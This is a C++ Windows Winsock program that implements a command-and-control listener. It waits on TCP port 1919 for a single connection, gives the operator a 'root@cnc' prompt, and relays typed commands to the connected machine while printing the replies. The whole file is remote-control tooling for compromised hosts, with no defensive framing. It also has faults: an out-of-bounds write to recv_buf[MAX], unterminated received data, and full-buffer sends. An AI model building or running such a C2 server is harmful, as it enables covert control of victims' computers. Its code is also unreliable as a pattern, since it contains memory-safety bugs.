#include <cstdio>
#include <cstring>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>

#define MAX 65536

class server{
private:
    int port_number;
    int src_socket;

    WSADATA wsa_data;

    char recv_buf[MAX];
    char send_buf[MAX];

    int status;
    int result;
public:
    void cnc();

    ~server() {
        WSACleanup();
    }
};

void server::cnc() {
    if (WSAStartup(MAKEWORD(2, 0), &wsa_data) != 0) {
        return;
    }

    port_number = 1919;

    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_port = htons(port_number);
    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    src_socket = socket(AF_INET, SOCK_STREAM, 0);

    bind(src_socket, (struct sockaddr *) &src_addr, sizeof(src_addr));

    int dst_socket;
    struct sockaddr_in dst_addr;
    int dst_addr_size = sizeof(dst_addr);

    listen(src_socket, 1);

    dst_socket = accept(src_socket, (struct sockaddr *) &dst_addr, &dst_addr_size);

    while (1) {
        printf("root@cnc:~$ ");
        fgets(send_buf, sizeof(send_buf), stdin);
        send_buf[strcspn(send_buf, "\r\n")] = 0;

        send(dst_socket, send_buf, sizeof(send_buf), 0);
        if (!strcmp(send_buf, "!q")) break;

        result = recv(dst_socket, recv_buf, sizeof(recv_buf), 0);
        if (result == 0 || result == -1) {
            status = closesocket(dst_socket);
            break;
        }

        printf("%s", recv_buf);
        recv_buf[MAX] = {0};
    }
}

void start() {
    server* cnc_server;
    cnc_server = new server();

    cnc_server->cnc();
}

int main() {
    std::thread th(start);
    th.join();

    return 0;
}
